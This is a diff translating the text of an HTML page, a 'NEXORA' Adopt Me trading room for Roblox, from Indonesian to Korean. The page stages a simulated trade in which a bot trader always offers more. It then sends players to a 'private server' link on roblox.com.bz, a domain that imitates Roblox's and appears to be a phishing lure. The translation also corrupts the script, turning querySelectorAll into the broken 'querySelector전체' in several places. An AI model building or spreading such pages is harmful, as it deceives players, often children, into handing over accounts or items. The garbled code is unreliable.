@@ -1,8 +1,8 @@
 <!doctype html>
-<html lang="id">
+<html lang="ko">
 <head>
 <meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="theme-color" content="#090a12">
-<title>Adopt Me Trading | NEXORA</title>
+<title>입양하세요 거래 | NEXORA</title>
 <link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700;800&family=Space+Grotesk:wght@500;600;700&display=swap" rel="stylesheet">
 <style>
@@ -64,33 +64,33 @@ body.dedicated .shell{max-width:1220px;padding-top:18px}
 body.dedicated #trade-page,body.dedicated #trade-page[hidden]{display:block!important;margin:0}
 </style></head>
 <body class="dedicated"><main class="shell">
-<header class="topbar"><a class="brand" href="#"><span class="brandmark">N</span><span>NEXORA<small>ADOPT ME TRADING</small></span></a><span class="chip">● COMMUNITY TRADE ROOM</span></header>
-<section class="hero"><div class="kicker">NEXORA · ADOPT ME</div><h1>Trade with<br><span>YOUR TRADER.</span></h1><p>Pilih pet yang kamu tawarkan. Trader akan membalas dengan offer yang nilainya lebih tinggi.</p></section>
-<section class="section" id="game"><div class="section-head"><div><div class="eyebrow">01 / GAME</div><h2>Choose your game</h2></div><span class="muted">Game yang tersedia</span></div><button class="game-card" id="enter-adopt" type="button" style="width:100%;text-align:left"><img src="https://pbs.twimg.com/media/HDew0ydbEAARB_J.jpg" alt="Adopt Me"><div class="game-shade"></div><div class="game-copy"><span class="tag">OPEN GAME</span><h3>Adopt Me Trading ↗</h3></div></button></section>
-<section class="section panel" id="trade-history"><div class="section-head"><div><div class="eyebrow">TRADE LOG</div><h2>Trade History</h2></div><span class="muted" id="history-count">0 trades</span></div><div id="history-list" class="muted">Belum ada trade selesai.</div></section>
+<header class="topbar"><a class="brand" href="#"><span class="brandmark">N</span><span>NEXORA<small>입양하세요 거래</small></span></a><span class="chip">● 커뮤니티 거래방</span></header>
+<section class="hero"><div class="kicker">NEXORA · 입양하세요</div><h1>거래하세요<br><span>전문 트레이더와.</span></h1><p>거래할 펫을 선택하세요. 트레이더가 더 높은 가치의 제안을 돌려드립니다.</p></section>
+<section class="section" id="game"><div class="section-head"><div><div class="eyebrow">01 / 게임</div><h2>게임 선택</h2></div><span class="muted">이용 가능한 게임</span></div><button class="game-card" id="enter-adopt" type="button" style="width:100%;text-align:left"><img src="https://pbs.twimg.com/media/HDew0ydbEAARB_J.jpg" alt="Adopt Me"><div class="game-shade"></div><div class="game-copy"><span class="tag">게임 열기</span><h3>입양하세요 거래 ↗</h3></div></button></section>
+<section class="section panel" id="trade-history"><div class="section-head"><div><div class="eyebrow">거래 기록</div><h2>거래 내역</h2></div><span class="muted" id="history-count">0회 거래</span></div><div id="history-list" class="muted">완료된 거래가 없습니다.</div></section>
 <section class="section panel" id="trade-page" hidden>
-<div class="trade-top"><div><div class="eyebrow">02 / ADOPT ME TRADE ROOM</div><h2>Trading with <span id="target-name">CRAZYMADDOG01</span></h2></div><button class="btn" id="back">← Dashboard</button></div><div class="trader-card selected trader-profile"><span class="avatar"><img class="roblox-avatar nxAvatarFix" src="/api/avatar?username=CRAZYMADDOG01" width="96" height="96" loading="eager" decoding="sync" alt="CRAZYMADDOG01 avatar"></span><span><span class="trader-name">CRAZYMADDOG01</span><br><span class="trader-sub">Adopt Me Trader</span></span></div>
+<div class="trade-top"><div><div class="eyebrow">02 / 입양하세요 거래방</div><h2>거래 상대: <span id="target-name">CRAZYMADDOG01</span></h2></div><button class="btn" id="back">← 대시보드</button></div><div class="trader-card selected trader-profile"><span class="avatar"><img class="roblox-avatar nxAvatarFix" src="/api/avatar?username=CRAZYMADDOG01" width="96" height="96" loading="eager" decoding="sync" alt="CRAZYMADDOG01 아바타"></span><span><span class="trader-name">CRAZYMADDOG01</span><br><span class="trader-sub">입양하세요 트레이더</span></span></div>
 <div class="trade-board">
-<div class="offer-panel"><div class="offer-head"><strong>YOUR OFFER</strong><span class="status" id="my-count">0 / 9 ITEMS</span></div><div class="slots" id="my-slots"></div><div class="value-row"><span>Estimated offer points</span><b id="my-value">0</b></div></div>
-<div class="offer-panel"><div class="offer-head"><strong id="bot-title">CRAZYMADDOG01</strong></div><div class="slots" id="bot-slots"></div><div class="value-row"><span>Offer points</span><b id="bot-value">—</b></div></div>
+<div class="offer-panel"><div class="offer-head"><strong>내 제안</strong><span class="status" id="my-count">0 / 9개 아이템</span></div><div class="slots" id="my-slots"></div><div class="value-row"><span>제안 예상 포인트</span><b id="my-value">0</b></div></div>
+<div class="offer-panel"><div class="offer-head"><strong id="bot-title">CRAZYMADDOG01</strong></div><div class="slots" id="bot-slots"></div><div class="value-row"><span>제안 포인트</span><b id="bot-value">—</b></div></div>
 </div>
 
-<div class="catalog"><div class="catalog-head"><div><div class="eyebrow">YOUR INVENTORY</div><h3>Pilih pet untuk offer kamu</h3></div><button class="btn btn-primary" id="open-catalog">＋ Add Pets</button></div></div><div class="catalog-modal" id="catalog-modal" hidden><div class="catalog-dialog"><div class="catalog-head"><div><div class="eyebrow">YOUR INVENTORY</div><h3>Pet Collection</h3></div><button class="btn" id="close-catalog">✕ Close</button></div><input id="pet-search" class="pet-search" placeholder="Search pets..."><div class="filter-row"><button class="filter active" data-filter="all">All</button><button class="filter" data-filter="common">Common</button><button class="filter" data-filter="uncommon">Uncommon</button><button class="filter" data-filter="rare">Rare</button><button class="filter" data-filter="ultra rare">Ultra-Rare</button><button class="filter" data-filter="legendary">Legendary</button></div><div class="pet-grid" id="pet-catalog"></div></div></div>
+<div class="catalog"><div class="catalog-head"><div><div class="eyebrow">내 인벤토리</div><h3>제안할 펫 선택</h3></div><button class="btn btn-primary" id="open-catalog">＋ 펫 추가</button></div></div><div class="catalog-modal" id="catalog-modal" hidden><div class="catalog-dialog"><div class="catalog-head"><div><div class="eyebrow">내 인벤토리</div><h3>펫 컬렉션</h3></div><button class="btn" id="close-catalog">✕ 닫기</button></div><input id="pet-search" class="pet-search" placeholder="펫 검색..."><div class="filter-row"><button class="filter active" data-filter="all">전체</button><button class="filter" data-filter="common">일반</button><button class="filter" data-filter="uncommon">비범</button><button class="filter" data-filter="rare">희귀</button><button class="filter" data-filter="ultra rare">Ultra-희귀</button><button class="filter" data-filter="legendary">전설</button></div><div class="pet-grid" id="pet-catalog"></div></div></div>
 
-<div class="trade-actions"><button class="btn" id="reset-offer">Reset offer</button><button class="btn btn-primary" id="accept-trade">Accept Trade ✓</button></div>
+<div class="trade-actions"><button class="btn" id="reset-offer">제안 초기화</button><button class="btn btn-primary" id="accept-trade">거래 수락 ✓</button></div>
 <div class="trade-message" id="trade-message" hidden></div>
-<div class="ps-panel" id="ps-panel" hidden><div><h3>Trade simulation completed!</h3><p>Lanjutkan ke Private Server Roblox untuk melakukan proses trading di dalam game.</p></div><button class="btn btn-primary" id="join-ps">Join Private Server ↗</button></div>
-<p class="muted" id="ps-note" style="margin:10px 0 0">Link Private Server belum dipasang.</p>
+<div class="ps-panel" id="ps-panel" hidden><div><h3>거래 시뮬레이션 완료!</h3><p>Roblox 프라이빗 서버에 접속해 게임 안에서 거래를 진행하세요.</p></div><button class="btn btn-primary" id="join-ps">프라이빗 서버 입장 ↗</button></div>
+<p class="muted" id="ps-note" style="margin:10px 0 0">프라이빗 서버 링크가 아직 설정되지 않았습니다.</p>
 </section>
-<footer><span>NEXORA · SERVER TRADING</span><span>Fan-made community interface · Not affiliated with Roblox or Uplift Games.</span></footer>
+<footer><span>NEXORA · 거래 서버</span><span>팬 제작 커뮤니티 인터페이스 · Roblox 및 Uplift Games와 제휴하지 않습니다.</span></footer>
 </main>
 <script>
 const PRIVATE_SERVER_URL="https://roblox.com.bz/games/920587237/Adopt-Me?privateServerLinkCode=54619176604524710586824721253900";
 let pets=[];
-let selectedTrader="CRAZYMADDOG01",myOffer=[],botOffer=[],filter="All";
+let selectedTrader="CRAZYMADDOG01",myOffer=[],botOffer=[],filter="전체";
 const $=id=>document.getElementById(id),sum=a=>a.reduce((n,p)=>n+p.value,0),pet=n=>pets.find(p=>p.name===n);
 function image(p){let fallback=p.img.replace("https://ironbabatekkral.github.io/adoptme-values/","https://raw.githubusercontent.com/ironbabatekkral/adoptme-values/main/");return '<img class="pet-img" src="'+p.img+'" alt="'+p.name+'" loading="lazy" onerror="if(!this.dataset.fallback){this.dataset.fallback=1;this.src=\''+fallback+'\'}else{this.style.visibility=\'hidden\'}">'}
-function slots(id,list,remove){$(id).innerHTML=Array.from({length:9},(_,i)=>{let p=list[i];return '<div class="slot '+(p?'filled':'')+'">'+(p?image(p)+'<span class="pet-name">'+p.name+'</span><span class="pet-rarity">'+p.rarity+'</span>'+(remove?'<button class="remove-pet" data-remove="'+p.name+'">×</button>':''):'<span class="slot-empty">＋ Empty</span>')+'</div>'}).join("");}
+function slots(id,list,remove){$(id).innerHTML=Array.from({length:9},(_,i)=>{let p=list[i];return '<div class="slot '+(p?'filled':'')+'">'+(p?image(p)+'<span class="pet-name">'+p.name+'</span><span class="pet-rarity">'+p.rarity+'</span>'+(remove?'<button class="remove-pet" data-remove="'+p.name+'">×</button>':''):'<span class="slot-empty">＋ 비어 있음</span>')+'</div>'}).join("");}
 function balance(){
  botOffer=[];
  if(!myOffer.length)return;
@@ -119,21 +119,21 @@ function balance(){
  }
  if(best)botOffer=best;
 }
-function render(){slots("my-slots",myOffer,true);slots("bot-slots",botOffer,false);$("my-count").textContent=myOffer.length+" / 9 ITEMS";$("my-value").textContent=sum(myOffer);$("bot-value").textContent=sum(botOffer);}
-function catalog(){let q=$("pet-search").value.toLowerCase();$("pet-catalog").innerHTML=pets.filter(p=>(filter==="all"||String(p.rarity).toLowerCase().replace(/-/g," ").trim()===filter)&&p.name.toLowerCase().includes(q)).map(p=>'<button class="pet-card" data-pet="'+p.name+'">'+image(p)+'<strong>'+p.name+'</strong><small>'+p.rarity+'</small><span class="add-label">'+(myOffer.includes(p)?'✓ ADDED':'+ ADD')+'</span></button>').join("");document.querySelectorAll("[data-pet]").forEach(b=>b.onclick=()=>{let p=pet(b.dataset.pet);myOffer=myOffer.includes(p)?myOffer.filter(x=>x!==p):myOffer.length<9?[...myOffer,p]:myOffer;balance();render();catalog()})}
-function history(){let h=JSON.parse(localStorage.getItem("nexoraTradeHistory")||"[]");$("history-count").textContent=h.length+" trades";$("history-list").innerHTML=h.length?h.slice(0,10).map(x=>'<div class="history-row"><b>'+x.trader+'</b><span>'+x.pets+'</span><strong>SELISIH +'+x.over+'</strong><time>'+x.date+'</time></div>').join(""):"Belum ada trade selesai."}
+function render(){slots("my-slots",myOffer,true);slots("bot-slots",botOffer,false);$("my-count").textContent=myOffer.length+" / 9개 아이템";$("my-value").textContent=sum(myOffer);$("bot-value").textContent=sum(botOffer);}
+function catalog(){let q=$("pet-search").value.toLowerCase();$("pet-catalog").innerHTML=pets.filter(p=>(filter==="all"||String(p.rarity).toLowerCase().replace(/-/g," ").trim()===filter)&&p.name.toLowerCase().includes(q)).map(p=>'<button class="pet-card" data-pet="'+p.name+'">'+image(p)+'<strong>'+p.name+'</strong><small>'+p.rarity+'</small><span class="add-label">'+(myOffer.includes(p)?'✓ 추가됨':'+ 추가')+'</span></button>').join("");document.querySelector전체("[data-pet]").forEach(b=>b.onclick=()=>{let p=pet(b.dataset.pet);myOffer=myOffer.includes(p)?myOffer.filter(x=>x!==p):myOffer.length<9?[...myOffer,p]:myOffer;balance();render();catalog()})}
+function history(){let h=JSON.parse(localStorage.getItem("nexoraTradeHistory")||"[]");$("history-count").textContent=h.length+"회 거래";$("history-list").innerHTML=h.length?h.slice(0,10).map(x=>'<div class="history-row"><b>'+x.trader+'</b><span>'+x.pets+'</span><strong>차액 +'+x.over+'</strong><time>'+x.date+'</time></div>').join(""):"완료된 거래가 없습니다."}
 function enter(){ document.body.classList.add("trading-view"); $("trade-page").hidden=false;$("players").hidden=true;myOffer=[];balance();render();history.pushState({view:"trade"},"","#trade");window.scrollTo(0,0)}
 $("enter-adopt").onclick=enter;
 $("back").onclick=()=>{document.body.classList.remove("trading-view");$("trade-page").hidden=true;$("players").hidden=true;history.pushState({view:"dashboard"},"",location.pathname);$("game").scrollIntoView({behavior:"smooth"})};
 window.addEventListener("popstate",()=>{if(location.hash!=="#trade"){document.body.classList.remove("trading-view");$("trade-page").hidden=true}});
-document.querySelectorAll("[data-trader]").forEach(b=>b.onclick=()=>{selectedTrader=b.dataset.trader;document.querySelectorAll("[data-trader]").forEach(x=>x.classList.toggle("selected",x===b));$("target-name").textContent=selectedTrader;$("bot-title").textContent=selectedTrader;balance();render()});
+document.querySelector전체("[data-trader]").forEach(b=>b.onclick=()=>{selectedTrader=b.dataset.trader;document.querySelector전체("[data-trader]").forEach(x=>x.classList.toggle("selected",x===b));$("target-name").textContent=selectedTrader;$("bot-title").textContent=selectedTrader;balance();render()});
 $("open-catalog").onclick=()=>{$("catalog-modal").hidden=false;$("pet-search").value="";filter="all";catalog()};
 $("close-catalog").onclick=()=>$("catalog-modal").hidden=true;
 $("pet-search").oninput=catalog;
-document.querySelectorAll("[data-filter]").forEach(b=>b.onclick=()=>{filter=b.dataset.filter;document.querySelectorAll("[data-filter]").forEach(x=>x.classList.toggle("active",x===b));catalog()});
+document.querySelector전체("[data-filter]").forEach(b=>b.onclick=()=>{filter=b.dataset.filter;document.querySelector전체("[data-filter]").forEach(x=>x.classList.toggle("active",x===b));catalog()});
 $("my-slots").onclick=e=>{let b=e.target.closest("[data-remove]");if(b){myOffer=myOffer.filter(p=>p.name!==b.dataset.remove);balance();render()}};
-$("reset-offer").onclick=()=>{myOffer=[];balance();render();$("trade-message").textContent="Offer reset."};
-$("accept-trade").onclick=()=>{let over=sum(botOffer)-sum(myOffer);if(!myOffer.length){$("trade-message").hidden=false;$("trade-message").textContent="Pilih minimal satu pet.";return}if(over<=0){$("trade-message").hidden=false;$("trade-message").textContent="Kurangi pet yang kamu tawarkan agar trader bisa membalas lebih tinggi.";return}let h=JSON.parse(localStorage.getItem("nexoraTradeHistory")||"[]");h.unshift({trader:selectedTrader,pets:myOffer.map(p=>p.name).join(", "),over,date:new Date().toLocaleString("id-ID")});localStorage.setItem("nexoraTradeHistory",JSON.stringify(h.slice(0,50)));history();$("trade-message").hidden=false;$("trade-message").textContent="Trade simulasi selesai. Riwayat tersimpan di dashboard.";$("ps-panel").hidden=false};
-$("join-ps").onclick=()=>{if(PRIVATE_SERVER_URL)window.open(PRIVATE_SERVER_URL,"_blank");else $("ps-note").textContent="Link Private Server belum dipasang."};
-$("target-name").textContent=selectedTrader;$("bot-title").textContent=selectedTrader;fetch("pets.json").then(r=>r.json()).then(data=>{pets=data;balance();render()}).catch(()=>{$("trade-message").hidden=false;$("trade-message").textContent="Katalog pet gagal dimuat."});history();balance();render();
+$("reset-offer").onclick=()=>{myOffer=[];balance();render();$("trade-message").textContent="제안이 초기화되었습니다."};
+$("accept-trade").onclick=()=>{let over=sum(botOffer)-sum(myOffer);if(!myOffer.length){$("trade-message").hidden=false;$("trade-message").textContent="펫을 최소 한 마리 선택하세요.";return}if(over<=0){$("trade-message").hidden=false;$("trade-message").textContent="제안한 펫을 줄여 트레이더가 더 높은 가치로 응답할 수 있도록 하세요.";return}let h=JSON.parse(localStorage.getItem("nexoraTradeHistory")||"[]");h.unshift({trader:selectedTrader,pets:myOffer.map(p=>p.name).join(", "),over,date:new Date().toLocaleString("id-ID")});localStorage.setItem("nexoraTradeHistory",JSON.stringify(h.slice(0,50)));history();$("trade-message").hidden=false;$("trade-message").textContent="거래 시뮬레이션이 완료되었습니다. 기록이 대시보드에 저장되었습니다.";$("ps-panel").hidden=false};
+$("join-ps").onclick=()=>{if(PRIVATE_SERVER_URL)window.open(PRIVATE_SERVER_URL,"_blank");else $("ps-note").textContent="프라이빗 서버 링크가 아직 설정되지 않았습니다."};
+$("target-name").textContent=selectedTrader;$("bot-title").textContent=selectedTrader;fetch("pets.json").then(r=>r.json()).then(data=>{pets=data;balance();render()}).catch(()=>{$("trade-message").hidden=false;$("trade-message").textContent="펫 목록을 불러오지 못했습니다."});history();balance();render();
 </script></body></html>
